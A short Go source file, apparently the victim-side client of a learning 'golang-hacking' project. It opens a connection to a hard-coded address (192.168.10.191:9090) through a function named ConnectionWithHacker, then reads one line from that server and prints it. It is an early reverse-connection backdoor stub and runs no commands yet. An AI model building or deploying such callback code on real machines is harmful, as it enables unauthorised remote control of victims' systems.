package main

import (
	"bufio"
	"fmt"
	"golang-hacking/VictimFinalVersion/core/handleConnection"
	"log"
	"strings"
)

func main() {
	ServerIP := "192.168.10.191"
	Port := "9090"
	connection, err := handleConnection.ConnectionWithHacker(ServerIP, Port)
	if err != nil {
		log.Fatal(err)
	}

	defer connection.Close()
	fmt.Println("[+] Connection established with Server :", connection.RemoteAddr().String())

	reader := bufio.NewReader(connection)

	dataReceived, err := reader.ReadString('\n')
	if err != nil {
		log.Fatal(err)
	}
	data := strings.TrimSuffix(dataReceived, "\n")
	fmt.Println(data)
}
